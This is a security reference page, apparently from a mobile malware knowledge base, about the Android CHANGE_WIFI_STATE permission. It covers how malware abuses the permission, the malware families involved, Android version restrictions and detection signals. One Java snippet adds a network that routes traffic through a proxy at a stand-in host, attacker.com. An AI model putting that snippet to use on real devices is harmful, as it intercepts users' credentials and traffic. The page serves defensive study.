# CHANGE_WIFI_STATE

Normal permission allowing an app to modify WiFi network configuration, enable/disable WiFi, and manipulate proxy settings. Auto-granted at install. Malware uses this to set network proxies for traffic interception, disable WiFi to force cellular connections (avoiding corporate network monitoring), and modify saved network configurations to redirect traffic through attacker-controlled infrastructure.

## Technical Details

| Attribute | Value |
|-----------|-------|
| Permission | `android.permission.CHANGE_WIFI_STATE` |
| Protection Level | `normal` |
| Grant Method | Automatically at install time (no user interaction) |
| Introduced | API 1 |
| User Visibility | None |
| Play Store Policy | No restrictions |

## What It Enables

### WiFi Toggle

```java
WifiManager wifiManager = (WifiManager) getSystemService(WIFI_SERVICE);
wifiManager.setWifiEnabled(false);
wifiManager.setWifiEnabled(true);
```

Note: `setWifiEnabled()` was deprecated in API 29 (Android 10) and restricted to system apps. On Android 10+, non-system apps must use the Settings panel intent to request WiFi state changes.

### Network Configuration

On older Android versions (pre-10), apps could add, modify, and remove saved WiFi networks:

```java
WifiConfiguration config = new WifiConfiguration();
config.SSID = "\"Attacker-AP\"";
config.preSharedKey = "\"password\"";
config.proxySettings = WifiConfiguration.ProxySettings.STATIC;
config.httpProxy = ProxyInfo.buildDirectProxy("attacker.com", 8080);
int netId = wifiManager.addNetwork(config);
wifiManager.enableNetwork(netId, true);
```

### WiFi Scanning

`CHANGE_WIFI_STATE` also allows triggering WiFi scans programmatically via `wifiManager.startScan()`, though this is throttled on Android 8+ and deprecated on Android 9+.

## Abuse in Malware

### Proxy-Based Traffic Interception

The primary abuse vector on older Android versions. By setting a static HTTP proxy in the WiFi configuration, all HTTP traffic from the device routes through the attacker's proxy server. See [Network Traffic Interception](../../attacks/network-traffic-interception.md).

| Step | Action |
|------|--------|
| 1 | Malware modifies the current WiFi network's proxy settings |
| 2 | All HTTP traffic routes through the attacker's proxy |
| 3 | Proxy captures credentials, session tokens, and other sensitive data |
| 4 | HTTPS traffic shows certificate warnings, but older apps or WebViews may not validate |

### WiFi Disablement

Disabling WiFi forces the device onto cellular data, which:

- Bypasses corporate WiFi monitoring and DLP systems
- Avoids WiFi-based network security appliances
- Forces traffic through mobile networks where the attacker may have interception capability
- Can trigger reconnection behaviors in banking apps that malware can exploit

### Evil Twin / Rogue AP

On pre-Android 10 devices, malware can programmatically add a saved WiFi network matching the SSID of a legitimate network but pointing to an attacker-controlled access point. When the device roams or reconnects, it may connect to the attacker's AP instead.

### Families Using WiFi Manipulation

| Family | Usage |
|--------|-------|
| [MoqHao](../../malware/families/moqhao.md) | DNS manipulation via WiFi settings on routers (Roaming Mantis campaign) |
| [Cerberus](../../malware/families/cerberus.md) | WiFi state checking for environment detection |
| [Mandrake](../../malware/families/mandrake.md) | Network environment profiling before payload activation |

## Android Version Changes

| Version | API | Change | Impact |
|---------|-----|--------|--------|
| 1.0 | 1 | Permission introduced | Full WiFi control |
| 6.0 | 23 | WiFi configuration changes require device owner or profile owner on managed devices | Limits enterprise environment manipulation |
| 8.0 | 26 | Background WiFi scan throttling (2-3/hour) | Reduces reconnaissance capability |
| 10 | 29 | `setWifiEnabled()` deprecated for third-party apps | Non-system apps cannot toggle WiFi programmatically |
| 10 | 29 | `addNetwork()` and `removeNetwork()` restricted | Non-system apps cannot modify saved WiFi configurations |
| 10 | 29 | WiFi suggestion API introduced as replacement | Suggestions can be ignored by the system; far less powerful |
| 11 | 30 | WiFi network suggestions expanded | More control via suggestions, but still not direct configuration modification |

Android 10 was the critical turning point. The deprecation of `setWifiEnabled()`, `addNetwork()`, and direct proxy configuration removed the most dangerous capabilities from non-system apps. Malware targeting Android 10+ must use accessibility services to navigate Settings UI for WiFi manipulation.

## Detection Indicators

### Manifest Signals

- `CHANGE_WIFI_STATE` combined with `ACCESS_WIFI_STATE` and `INTERNET` in apps with no network management purpose
- `CHANGE_WIFI_STATE` + proxy-related code (`ProxyInfo`, `httpProxy`)
- WiFi manipulation code alongside banking trojan indicators (overlay, accessibility)

### Behavioral Signals

- Calls to `setWifiEnabled(false)` during active network connections
- Proxy configuration modifications on the current WiFi network
- `addNetwork()` calls creating networks with proxy settings or matching existing SSIDs
